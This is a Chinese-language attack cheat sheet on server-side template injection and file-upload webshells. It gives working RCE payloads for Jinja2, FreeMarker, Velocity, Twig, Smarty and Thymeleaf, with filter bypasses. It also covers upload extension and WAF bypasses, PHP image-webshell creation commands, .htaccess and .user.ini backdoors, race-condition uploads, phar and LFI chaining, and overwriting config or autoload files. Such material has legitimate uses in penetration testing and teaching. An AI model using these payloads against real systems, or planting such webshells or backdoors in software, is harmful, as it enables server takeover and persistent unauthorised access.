# SSTI 模板注入 & 文件上传 Getshell 实战手册

## 1. SSTI 模板注入

### 通用探测
```
{{7*7}} -> 49 (Jinja2/Twig)
${7*7} -> 49 (FreeMarker/Velocity)
#{7*7} -> 49 (FreeMarker数值)
<%=7*7%> -> 49 (ERB)
```

### Jinja2 (Python/Flask)
```python
# 探测
{{7*7}}  {{config}}  {{self}}

# 读取变量
{{''.__class__.__mro__[1].__subclasses__()}}

# RCE payload
{{''.__class__.__mro__[1].__subclasses__()[X]}}  # X为subprocess.Popen的索引

# 常用RCE链
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

# 绕过过滤
# 过滤器拼接
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
# request对象
{{request.application.__globals__.__builtins__.__import__('os').popen('cmd').read()}}
# 字符串拼接
{{''.__class__.__bases__[0].__subclasses__()[X](['cmd'],shell=True)}}
```

### FreeMarker (Java)
```java
// 探测
${7*7}  #{7*7}

// 经典RCE
${"freemarker.template.utility.Execute"?new()("id")}

// 限制绕过
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}

// 无new()时 (Spring Boot集成)
// 通过JNDI/ObjectConstructor间接利用
```

### Velocity (Java)
```java
#set($cmd="id")
#set($rt=$class.forName("java.lang.Runtime"))
$rt.getRuntime().exec($cmd)
```

### Twig (PHP)
```twig
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['id']|map('system')}}
```

### Smarty (PHP)
```smarty
{$smarty.template_object->smarty->enableSecurity()}  (解禁)
{system('id')}
{php}system('id');{/php}
```

### Thymeleaf (Java Spring)
```html
<!-- 预处理表达式 -->
__${T(java.lang.Runtime).getRuntime().exec('cmd')}__::
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cmd').getInputStream()).next()}__::
```

## 2. 文件上传 Getshell

### 扩展名绕过大全
| 服务器 | 绕过手法 | 示例 |
|--------|----------|------|
| IIS 6 | 分号截断 .asp;.jpg | shell.asp;.jpg |
| IIS 7+ | 路径截断, web.config | web.config write |
| Apache | 双扩展 .php.xxx | shell.php.jpg |
| Nginx | 解析漏洞 .php/1.jpg | shell.jpg -> /shell.jpg/1.php |
| Tomcat | %00截断/JSP变种 | shell.jsp%00.jpg |
| 通用 | 大小写 PHP/phP | shell.PhP |
| 通用 | 空格 .php空格 | shell.php%20 |
| 通用 | 点 .php. | shell.php. |
| 通用 | ::$DATA (Win) | shell.php::$DATA |

### Content-Type 绕过
```
multipart: Content-Type: image/gif / image/png / image/jpeg
通常只校验MIME类型 -> 直接改Content-Type
```

### 文件头伪造
```
GIF: GIF89a;  PNG: \x89PNG;  JPG: \xff\xd8\xff\xe0
在webshell前面加上对应文件头即可
```

### 图片马
```bash
# exiftool注入
exiftool -Comment='<?php system($_POST["x"]);?>' img.jpg

# 直接拼接
echo 'GIF89a;<?php system($_POST["x"]);?>' > shell.gif

# 图片无损注入 (LSB隐写)
# copy /b 1.jpg + shell.php result.jpg
```

### .htaccess/.user.ini 后门
```
.htaccess: AddType application/x-httpd-php .jpg
-> shell.jpg被当作PHP执行

.user.ini: auto_prepend_file=shell.jpg
-> 所有PHP请求自动包含shell.jpg

web.config: (IIS) 配置替换handler
```

### 条件竞争上传
```python
# 上传后文件短暂存活 -> 在删除前访问
import threading, requests
def upload(): 循环上传
def access(): 循环访问
threading.Thread+同时执行
```

### WAF绕过上传
```
1. boundary混淆: ----WebKitFormBoundary... 大小写变换
2. Content-Disposition变形: name变形/大小写/空格
3. filename= 重复或多重编码
4. 分片上传/分块(slice)上传
5. multipart/mixed 嵌套
```

### 上传后包含 Getshell
```
上传图片马 -> LFI包含 (/proc/self/fd/X)
上传日志污染 -> include日志文件
session文件污染 -> include session
phar文件上传 -> file_exists触发反序列化
```

### 覆盖文件手法
```
覆盖模板: admin/template/default/index.php
覆盖配置: config.php / database.php -> 写shell
覆盖autoload: vendor/autoload.php -> 类加载劫持
上传python模块: site-packages/ 覆盖__init__.py
```

## 3. 综合利用链
```
1. 上传+.htaccess -> 图片马变PHP
2. 上传+.user.ini -> 所有PHP包含图片马
3. 上传+文件包含(/proc) -> 临时文件RCE
4. 上传+Phar反序列化 -> 反序列化RCE
5. SSTI + 写文件 -> 覆盖模板 -> 二次RCE
6. 上传+move_uploaded_file目录穿越覆盖关键文件
```

> 工具: tplmap(SSTI自动化), fuxploider(上传fuzzer), xxegen
